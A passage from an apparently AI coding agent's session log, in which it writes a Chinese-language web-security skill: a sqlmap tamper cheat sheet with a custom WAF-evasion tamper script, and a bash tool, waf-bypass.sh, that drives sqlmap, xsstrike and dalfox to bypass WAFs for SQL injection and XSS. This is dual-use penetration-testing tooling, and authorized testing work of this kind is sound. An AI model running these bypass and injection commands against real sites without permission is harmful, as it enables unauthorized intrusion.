andomcase | 大小写随机 |\n+151 | equaltolike | = 替换为 LIKE |\n+152 | greatest | > 替换为 GREATEST |\n+153 \n+154 ### 9. 自定义 Tamper 脚本\n+155 \n+156 创建自定义 Tamper（保存为 `mytamper.py`）：\n+157 \n+158 ```python\n+159 #!/usr/bin/env python\n+160 def tamper(payload, **kwargs):\n+161     if payload:\n+162         payload = payload.replace(\" \", \"/**/\")\n+163         payload = payload.replace(\"'\", \"/*'*/\")\n+164     return payload\n+165 ```\n+166 \n+167 使用自定义 Tamper：\n+168 ```bash\n+169 sqlmap -u \"http://target.com?id=1\" --tamper=mytamper\n+170 ```\n+171 \n 101 ## 常用命令速查\n 102 \n 103 | 功能 | 命令 |\n 104 |------|------|\n     ...","firstChangedLine":101},"isError":false,"timestamp":1771490043648}}
{"type":"message","id":"08f3cc9a","parentId":"483bc5c6","timestamp":"2026-02-19T08:34:23.521Z","message":{"role":"assistant","content":[{"type":"thinking","thinking":"现在添加 WAF 绕过脚本。","thinkingSignature":"8ea65d0820aafc18ce6485be71135a62220cc91020a31ce8e3f7b6c30b7f0840"},{"type":"toolCall","id":"call_function_vpxif26b7la4_1","name":"write","arguments":{"content":"#!/bin/bash\n# WAF 绕过工具脚本\n\nWAFWAF_VERSION=\"1.0.0\"\n\n# 颜色定义\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nNC='\\033[0m'\n\n# WAF 识别\nwaf_identify() {\n    local target=\"$1\"\n    echo -e \"${GREEN}[*] 识别 WAF...${NC}\"\n    \n    if command -v whatwaf &> /dev/null; then\n        whatwaf --esp -u \"$target\"\n    elif command -v wafw00f &> /dev/null; then\n        wafw00f \"$target\"\n    else\n        echo -e \"${RED}[!] 请安装 whatwaf 或 wafw00f${NC}\"\n        echo \"pip install whatwaf wafw00f\"\n    fi\n}\n\n# SQL 注入绕过\nsql_bypass() {\n    local url=\"$1\"\n    local tamper=\"${2:-space2comment,between,randomcase}\"\n    \n    echo -e \"${GREEN}[*] SQL 注入绕过测试...${NC}\"\n    echo -e \"${YELLOW}[*] URL: $url${NC}\"\n    echo -e \"${YELLOW}[*] Tamper: $tamper${NC}\"\n    \n    sqlmap -u \"$url\" --batch --tamper=\"$tamper\" --level=5 --risk=3\n}\n\n# XSS 绕过\nxss_bypass() {\n    local url=\"$1\"\n    \n    echo -e \"${GREEN}[*] XSS 绕过测试...${NC}\"\n    echo -e \"${YELLOW}[*] URL: $url${NC}\"\n    \n    if command -v xsstrike &> /dev/null; then\n        xsstrike -u \"$url\" --encode --blind\n    elif command -v dalfox &> /dev/null; then\n        dalfox url \"$url\" --blind\n    else\n        echo -e \"${RED}[!] 请安装 xsstrike 或 dalfox${NC}\"\n    fi\n}\n\n# HTTP 代理绕过\nproxy_bypass() {\n    local url=\"$1\"\n    local proxy=\"${2:-http://127.0.0.1:8080}\"\n    \n    echo -e \"${GREEN}[*] 使用代理绕过...${NC}\"\n    echo -e \"${YELLOW}[*] URL: $url${NC}\"\n    echo -e \"${YELLOW}[*] Proxy: $proxy${NC}\"\n    \n    sqlmap -u \"$url\" --proxy=\"$proxy\" --random-agent --delay=1\n}\n\n# 显示帮助\nshow_help() {\n    cat << EOF\nWeb Security - WAF 绕过工具 v${WAFWAF_VERSION}\n\n用法: websec-waf <command> [options]\n\n命令:\n  identify <target>      识别 WAF 类型\n  sql <url> [tamper]     SQL 注入绕过\n  xss <url>              XSS 绕过测试\n  proxy <url> [proxy]    使用代理绕过\n\n示例:\n  websec-waf identify http://target.com\n  websec-waf sql \"http://target.com?id=1\"\n  websec-waf sql \"http://target.com?id=1\" \"space2comment,between\"\n  websec-waf xss \"http://target.com/search?q=test\"\n  websec-waf proxy \"http://target.com?id=1\"\n\nTamper 脚本组合:\n  space2comment,between,randomcase\n  space2comment,charencode\n  between,equaltolike\nEOF\n}\n\n# 主命令处理\ncase \"$1\" in\n    identify)\n        waf_identify \"$2\"\n        ;;\n    sql)\n        sql_bypass \"$2\" \"$3\"\n        ;;\n    xss)\n        xss_bypass \"$2\"\n        ;;\n    proxy)\n        proxy_bypass \"$2\" \"$3\"\n        ;;\n    help|--help|-h)\n        show_help\n        ;;\n    *)\n        show_help\n        ;;\nesac\n","path":"/home/ecs-user/.openclaw/workspace/skills/web-security/scripts/waf-bypass.sh"}}],"api":"anthropic-messages","provider":"minimax-cn","model":"MiniMax-M2.5","usage":{"input":127732,"output":920,"cacheRead":18210,"cacheWrite":0,"totalTokens":146862,"cost":{"input":1.91598,"output":0.0552,"cacheRead":0.03642,"cacheWrite":0,"total":2.0076}},"stopReason":"toolUse","timestamp":1771490043674}}
